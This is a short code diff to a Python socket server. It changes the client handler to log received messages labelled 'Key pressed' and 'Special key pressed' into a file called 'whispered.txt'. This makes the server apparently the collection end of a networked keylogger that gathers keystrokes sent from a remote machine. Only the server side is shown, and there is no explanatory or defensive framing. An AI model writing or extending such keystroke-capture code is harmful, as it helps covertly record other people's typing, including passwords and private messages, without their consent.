@@ -16,12 +16,19 @@ def get_host_ip():
 
 def handle_client(client_socket):
     try:
-        while True:
-            # Receive data from the client
-            data = client_socket.recv(1024)
-            if not data:
-                break
-            print(f"Received data: {data.decode('utf-8')}")
+        with open("whispered.txt", "a") as logfile:
+            while True:
+                # Receive data from the client
+                data = client_socket.recv(1024)
+                if not data:
+                    break
+                decoded_data = data.decode('utf-8')
+                print(f"Received data: {decoded_data}")
+
+                if decoded_data.startswith("Special key pressed:"):
+                    logfile.write("\n" + decoded_data[len("Special key pressed: "):] + " ")
+                else:
+                    logfile.write(decoded_data[len("Key pressed: "):])
     except Exception as e:
         print(f"Client disconnected: {e}")
     finally:
